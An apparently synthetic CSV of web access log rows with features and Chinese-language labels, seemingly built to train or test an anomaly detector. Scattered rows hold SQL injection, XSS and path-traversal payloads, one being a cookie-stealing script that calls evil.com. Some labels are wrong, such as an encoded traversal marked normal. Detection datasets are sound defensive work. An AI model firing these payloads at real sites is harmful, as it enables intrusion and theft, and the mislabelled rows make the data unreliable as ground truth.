ip,timestamp,method,url,status,size,user_agent,url_length,special_char_ratio,has_sql_keywords,has_xss_pattern,path_depth,num_query_params,anomaly_score,is_anomaly,anomaly_type
10.0.0.5,20/May/2025:14:20:17 +0800,GET,/api/v2/data?limit=20&offset=0,200,32884,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
192.168.1.12,20/May/2025:17:14:30 +0800,GET,/api/products?page=1,200,32261,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
8.8.8.8,20/May/2025:19:50:17 +0800,GET,/terms.html,200,30734,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
203.0.113.5,20/May/2025:20:23:07 +0800,GET,/index.html,301,38240,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
10.0.0.5,20/May/2025:17:59:45 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,200,4686,Hydra/9.4,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
45.33.32.100,20/May/2025:03:28:25 +0800,GET,/profile/settings,200,1856,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
192.168.1.12,20/May/2025:11:18:18 +0800,GET,/detail?id=1 OR 1=1#,500,577,Wget/1.21.3,20,0.25,1,0,0,1,0.38938665326318955,1,SQL注入
114.114.114.114,20/May/2025:10:50:13 +0800,GET,/blog/post-2.html,200,22565,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
172.16.0.3,20/May/2025:15:42:18 +0800,GET,/api/v2/data?limit=20&offset=0,304,2165,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
45.33.32.100,20/May/2025:17:37:24 +0800,GET,/js/main.js,304,26490,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
8.8.8.8,20/May/2025:12:22:32 +0800,GET,/profile/settings,301,15243,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
192.168.1.12,20/May/2025:05:23:10 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,200,1188,curl/8.4.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
192.168.1.12,20/May/2025:13:02:40 +0800,GET,/page?q=<svg onload=alert('XSS')>,200,4892,curl/8.4.0,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
192.168.1.11,20/May/2025:17:50:02 +0800,GET,/list?category=1 UNION ALL SELECT table_name FROM information_schema.tables--,500,3988,python-requests/2.31.0,77,0.06493506493506493,1,0,0,1,0.963961862375453,1,SQL注入
203.0.113.10,20/May/2025:00:28:56 +0800,GET,/api/products?page=1,200,8849,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,20,0.2,0,0,1,1,0.17589686625199608,0,正常
66.249.66.1,20/May/2025:12:37:29 +0800,GET,/api/products?page=1,200,34992,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,20,0.2,0,0,1,1,0.17589686625199608,0,正常
172.16.0.7,20/May/2025:21:26:15 +0800,GET,/sitemap.xml,200,10028,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
10.0.0.12,20/May/2025:03:12:31 +0800,GET,/api/notifications?unread=true,200,1098,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
10.0.0.12,20/May/2025:05:58:45 +0800,GET,/news.php?id=1' AND 1=1--,400,1561,python-requests/2.31.0,25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
172.16.0.3,20/May/2025:12:47:33 +0800,GET,/api/v2/data?limit=20&offset=0,301,24360,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
192.168.1.10,20/May/2025:01:11:43 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,400,2723,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
1.1.1.1,20/May/2025:17:52:44 +0800,GET,/sitemap.xml,200,13714,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
10.0.0.12,20/May/2025:19:14:47 +0800,GET,/blog/post-2.html,301,35306,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
192.168.1.11,20/May/2025:21:57:43 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,404,834,Mozilla/5.0 (compatible; Nmap Scripting Engine),52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
172.16.0.15,20/May/2025:18:48:15 +0800,GET,/static/fonts/arial.woff,200,48655,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
192.168.1.12,20/May/2025:16:31:56 +0800,GET,/..%2f..%2f..%2fetc/passwd,403,2552,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
10.0.0.20,20/May/2025:03:14:01 +0800,GET,/include?page=..%c0%af..%c0%af..%c0%afetc/passwd,403,1736,curl/8.4.0,36,0.1111111111111111,0,0,0,1,0.3720467579562914,0,正常
198.51.100.7,20/May/2025:05:19:49 +0800,GET,/blog/post-2.html,304,28587,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
192.168.1.15,20/May/2025:05:03:42 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",400,3711,sqlmap/1.7,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
223.5.5.5,20/May/2025:23:48:28 +0800,GET,/images/logo.png,200,49074,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,16,0.125,0,0,1,0,0.1790458069822886,0,正常
10.0.0.8,20/May/2025:15:51:06 +0800,GET,/profile/settings,304,31556,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
66.249.66.1,20/May/2025:14:35:22 +0800,GET,/api/notifications?unread=true,200,25760,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
66.249.66.1,20/May/2025:08:29:14 +0800,GET,/blog/post-1.html,304,24816,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
192.168.1.15,20/May/2025:14:30:04 +0800,GET,/download?file=../../../etc/passwd,200,1293,sqlmap/1.7,34,0.20588235294117646,0,0,0,1,0.2130243670859868,1,路径遍历
66.249.66.1,20/May/2025:18:35:22 +0800,GET,/css/bootstrap.min.css,200,14164,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
10.0.0.8,20/May/2025:00:42:02 +0800,GET,/blog/post-2.html,200,4523,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
192.168.1.11,20/May/2025:01:02:12 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,400,3670,Hydra/9.4,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
172.16.0.3,20/May/2025:18:22:40 +0800,GET,/downloads/manual.pdf,200,47728,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
192.168.1.10,20/May/2025:20:59:02 +0800,GET,/static/fonts/arial.woff,200,20510,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,24,0.125,0,0,2,0,0.5425787596690497,0,正常
66.249.66.1,20/May/2025:13:43:43 +0800,GET,/images/banner.jpg,200,17114,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
192.168.1.12,20/May/2025:00:58:24 +0800,GET,/images/../../../etc/hosts,400,1613,Mozilla/5.0 (compatible; Nmap Scripting Engine),26,0.23076923076923078,0,0,5,0,1.0,1,路径遍历
192.168.1.15,20/May/2025:15:51:56 +0800,GET,/redirect?url=javascript:alert(document.domain),403,2115,sqlmap/1.7,47,0.10638297872340426,0,1,0,1,0.42715866125403645,1,XSS攻击
203.0.113.10,20/May/2025:06:25:25 +0800,GET,/contact.html,304,28569,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
223.5.5.5,20/May/2025:05:41:10 +0800,GET,/js/main.js,200,37944,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
45.33.32.100,20/May/2025:11:24:34 +0800,GET,/sitemap.xml,200,14498,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
192.168.1.10,20/May/2025:18:40:51 +0800,GET,/js/main.js,304,49771,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
114.114.114.114,20/May/2025:07:36:32 +0800,GET,/api/search?q=phone,200,1662,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
114.114.114.114,20/May/2025:13:24:45 +0800,GET,/dashboard,200,48381,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.1,0,0,0,0,0.4211127014307052,0,正常
172.16.0.3,20/May/2025:06:00:08 +0800,GET,/contact.html,200,14038,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
203.0.113.10,20/May/2025:01:17:27 +0800,GET,/api/user?id=3,200,12272,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
192.168.1.12,20/May/2025:06:07:47 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,500,4537,sqlmap/1.7,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
192.168.1.10,20/May/2025:20:09:56 +0800,GET,/blog/post-1.html,200,10495,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
172.16.0.15,20/May/2025:20:56:25 +0800,GET,/dashboard,200,23459,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,10,0.1,0,0,0,0,0.4211127014307052,0,正常
203.0.113.5,20/May/2025:05:41:13 +0800,GET,/register.html,200,48377,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
10.0.0.20,20/May/2025:14:06:41 +0800,GET,/css/bootstrap.min.css,200,5732,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
8.8.8.8,20/May/2025:13:47:00 +0800,GET,/login.html,200,16161,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
10.0.0.8,20/May/2025:09:08:11 +0800,GET,/forum?post=<script>fetch('http://evil.com?c='+document.cookie)</script>,200,2658,sqlmap/1.7,72,0.2361111111111111,1,1,0,1,0.6075385415259974,1,XSS攻击
203.0.113.5,20/May/2025:03:28:24 +0800,GET,/category/electronics,301,18991,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
114.114.114.114,20/May/2025:22:14:50 +0800,GET,/api/orders?status=active,304,38537,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,25,0.16,0,0,1,1,0.3559522842791986,0,正常
192.168.1.10,20/May/2025:06:04:30 +0800,GET,/sitemap.xml,304,21912,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
192.168.1.12,20/May/2025:04:54:42 +0800,GET,/../../../etc/passwd,500,712,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,路径遍历
10.0.0.5,20/May/2025:01:57:52 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",403,3315,Wget/1.21.3,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
203.0.113.5,20/May/2025:15:10:41 +0800,GET,/blog/post-1.html,200,22802,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
10.0.0.5,20/May/2025:15:45:24 +0800,GET,/read?path=....//....//....//etc/passwd,200,715,sqlmap/1.7,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
198.51.100.7,20/May/2025:23:58:45 +0800,GET,/api/orders?status=active,200,39926,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,25,0.16,0,0,1,1,0.3559522842791986,0,正常
192.168.1.11,20/May/2025:16:02:22 +0800,GET,/news.php?id=1' AND 1=1--,500,824,Mozilla/5.0 (compatible; Nmap Scripting Engine),25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
10.0.0.8,20/May/2025:10:06:35 +0800,GET,/search?id=1 OR 1=1,200,1239,sqlmap/1.7,19,0.21052631578947367,1,0,0,1,0.42170703205838495,1,SQL注入
203.0.113.10,20/May/2025:21:30:26 +0800,GET,/api/v2/data?limit=20&offset=0,200,21367,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
192.168.1.11,20/May/2025:21:49:06 +0800,GET,/api/products?page=1,200,10936,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
8.8.8.8,20/May/2025:04:12:26 +0800,GET,/js/app.js,200,20491,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.2,0,0,1,0,0.36607100387519964,0,正常
172.16.0.3,20/May/2025:02:51:16 +0800,GET,/register.html,200,14806,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
192.168.1.11,20/May/2025:12:10:30 +0800,GET,/download?file=1' UNION SELECT password FROM admin--,400,829,python-requests/2.31.0,52,0.11538461538461539,1,0,0,1,0.3955366455843667,1,SQL注入
203.0.113.5,20/May/2025:03:24:19 +0800,GET,/static/fonts/arial.woff,200,41454,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,24,0.125,0,0,2,0,0.5425787596690497,0,正常
10.0.0.20,20/May/2025:19:02:15 +0800,GET,/blog/post-2.html,200,29045,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
10.0.0.20,20/May/2025:09:30:21 +0800,GET,/js/app.js,200,42328,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.2,0,0,1,0,0.36607100387519964,0,正常
172.16.0.3,20/May/2025:05:54:37 +0800,GET,/downloads/manual.pdf,200,3845,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
192.168.1.12,20/May/2025:09:40:29 +0800,GET,/profile/settings,200,25969,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
192.168.1.10,20/May/2025:21:36:41 +0800,GET,/downloads/manual.pdf,200,47544,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
192.168.1.11,20/May/2025:03:04:29 +0800,GET,/news.php?id=1' AND 1=1--,400,3600,python-requests/2.31.0,25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
10.0.0.5,20/May/2025:05:55:24 +0800,GET,/about.html,200,43447,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
45.33.32.100,20/May/2025:01:08:52 +0800,GET,/robots.txt,200,42261,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
198.51.100.7,20/May/2025:06:14:26 +0800,GET,/api/v2/data?limit=20&offset=0,304,48350,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
1.1.1.1,20/May/2025:07:48:50 +0800,GET,/api/products?page=1,304,49551,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
203.0.113.10,20/May/2025:10:41:34 +0800,GET,/sitemap.xml,200,1933,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
10.0.0.12,20/May/2025:15:32:36 +0800,GET,/dashboard,200,9947,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,10,0.1,0,0,0,0,0.4211127014307052,0,正常
172.16.0.7,20/May/2025:11:20:21 +0800,GET,/category/electronics,304,22197,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
192.168.1.12,20/May/2025:06:54:02 +0800,GET,/download?file=../../../etc/passwd,500,880,Hydra/9.4,34,0.20588235294117646,0,0,0,1,0.2130243670859868,1,路径遍历
172.16.0.7,20/May/2025:09:39:27 +0800,GET,/profile/settings,200,2632,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
10.0.0.12,20/May/2025:23:22:31 +0800,GET,/downloads/manual.pdf,304,15089,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
10.0.0.8,20/May/2025:22:38:50 +0800,GET,/images/logo.png,200,21546,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,16,0.125,0,0,1,0,0.1790458069822886,0,正常
1.1.1.1,20/May/2025:15:57:58 +0800,GET,/downloads/manual.pdf,200,38318,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
1.1.1.1,20/May/2025:02:02:40 +0800,GET,/sitemap.xml,304,5755,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
192.168.1.15,20/May/2025:14:39:53 +0800,GET,/images/logo.png,200,41015,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,16,0.125,0,0,1,0,0.1790458069822886,0,正常
192.168.1.11,20/May/2025:20:18:06 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",404,4381,sqlmap/1.7,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
10.0.0.12,20/May/2025:22:47:31 +0800,GET,/login?user=admin'--&pass=anything,200,2283,python-requests/2.31.0,34,0.23529411764705882,1,0,0,2,0.8054098751394609,1,SQL注入
203.0.113.10,20/May/2025:04:23:26 +0800,GET,/robots.txt,200,43167,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
192.168.1.12,20/May/2025:20:02:17 +0800,GET,/review?text=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,404,4355,Wget/1.21.3,59,0.23728813559322035,1,1,0,1,0.4725875135982099,1,XSS攻击
192.168.1.12,20/May/2025:18:41:22 +0800,GET,/terms.html,200,34100,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
192.168.1.12,20/May/2025:05:06:06 +0800,GET,/search?id=1 OR 1=1,200,2863,python-requests/2.31.0,19,0.21052631578947367,1,0,0,1,0.42170703205838495,1,SQL注入
10.0.0.20,20/May/2025:23:00:08 +0800,GET,/static/fonts/arial.woff,200,38593,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
192.168.1.10,20/May/2025:07:52:09 +0800,GET,/comment?msg=<img src=x onerror=alert(1)>,403,2330,Wget/1.21.3,41,0.21951219512195122,0,1,0,1,0.26239957001406006,1,XSS攻击
192.168.1.15,20/May/2025:13:44:29 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,400,2281,Hydra/9.4,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
10.0.0.5,20/May/2025:12:49:21 +0800,GET,/news.php?id=1' AND 1=1--,400,4587,Hydra/9.4,25,0.28,1,0,0,1,0.3656998525130988,1,SQL注入
192.168.1.11,20/May/2025:01:42:38 +0800,GET,/api/user?id=3,200,12518,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
172.16.0.15,20/May/2025:05:56:47 +0800,GET,/api/products?page=1,301,31699,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
192.168.1.15,20/May/2025:22:08:09 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",400,1345,python-requests/2.31.0,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
203.0.113.10,20/May/2025:08:48:09 +0800,GET,/images/logo.png,301,23080,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,16,0.125,0,0,1,0,0.1790458069822886,0,正常
223.5.5.5,20/May/2025:06:02:46 +0800,GET,/images/banner.jpg,301,41178,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
10.0.0.12,20/May/2025:13:04:33 +0800,GET,"/product?id=2' UNION SELECT NULL,NULL,NULL--",404,1530,python-requests/2.31.0,44,0.13636363636363635,1,0,0,1,0.3473683343907862,1,SQL注入
45.33.32.100,20/May/2025:20:23:47 +0800,GET,/images/banner.jpg,200,39357,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
172.16.0.3,20/May/2025:15:36:40 +0800,GET,/register.html,304,37370,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
10.0.0.20,20/May/2025:00:47:39 +0800,GET,/search?q=<body onload=alert(1)>,404,3646,python-requests/2.31.0,32,0.25,0,1,0,1,0.25939519289033136,1,XSS攻击
192.168.1.10,20/May/2025:13:24:36 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,403,182,sqlmap/1.7,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
